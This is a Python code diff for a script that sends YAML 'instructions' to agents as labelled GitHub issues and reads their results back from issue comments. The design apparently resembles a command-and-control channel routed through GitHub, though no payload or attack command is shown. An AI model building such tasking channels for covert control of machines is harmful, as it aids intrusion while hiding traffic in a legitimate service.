@@ -1,6 +1,6 @@
 
 from github import Github
-from github.GithubException import GithubException
+from github.GithubException import GithubException, UnknownObjectException
 from github.GithubObject import NotSet
 from uuid import uuid4
 from yaml import load, dump, scanner
@@ -29,7 +29,20 @@ def createRepo(user,repo):
 		print("Unable to create repo {}...".format(repo))
 		print("status:{}, data:{}".format(ge.status,ge.data))
 
-def createIssue(agentid, repo, reqfile):
+def createIssueFromInstructions(agentid, repo, instructions):
+	try:
+		print(dump(instructions))
+
+		issue_title=instructions["issue"]["title"]
+		issue_body=instructions["issue"]["body"]
+		issue_label=agentid
+
+		issue=repo.create_issue(title=issue_title, body=dump(issue_body), labels=[issue_label])	
+		return issue
+	except scanner.ScannerError as yse:
+		print("Error: {}".format(yse))
+
+def createIssueFromFile(agentid, repo, reqfile):
 	try:
 		stream = file(reqfile, 'r')
 		instructions=load(stream)
@@ -37,12 +50,45 @@ def createIssue(agentid, repo, reqfile):
 
 		issue_title=instructions["issue"]["title"]
 		issue_body=instructions["issue"]["body"]
+		#print type(dump(issue_body))
+		#return None
 		issue_label=agentid
 
-		repo.create_issue(title=issue_title, body=issue_body, labels=[issue_label])	
+		issue=repo.create_issue(title=issue_title, body=dump(issue_body), labels=[issue_label])	
+		return issue
 	except IOError as ioe:
 		print("Error: {}".format(ioe))
 	except scanner.ScannerError as yse:
 		print("Error: {}".format(yse))
+
+def checkIssueOutput(repo, issue_number):
+	try:
+		issue=repo.get_issue(int(issue_number))
+		if issue.state == "open":
+			print("Issue {} is stil OPEN".format(issue.title))
+		else:
+			print("Issue ({}:{}) - {} ".format(issue.number, issue.state, issue.title))
+			for comment in issue.get_comments():
+				print(comment.body)	
+	except UnknownObjectException as ue:
+		print("Unable to find Issue: {}, {}".format(issue_number, ue))
+
+	return repo
+
+def checkIssueStates(repo, agentid, top):
+	agentlabel=repo.get_label(agentid)
+
+	for ix,i in enumerate(repo.get_issues(state="open", labels=[agentlabel,])):
+		if int(ix) >= int(top):
+			break
+		else:
+			print("{}) {} [{}] - {}".format(ix, i.number, i.state, i.title))
+
+	for ix,i in enumerate(repo.get_issues(state="closed", labels=[agentlabel,])):
+		if int(ix) == int(top):
+			break
+		else:
+			print("{}) {} [{}@{}] - {}".format(ix, i.number, i.state, i.closed_at, i.title))
+
 
 
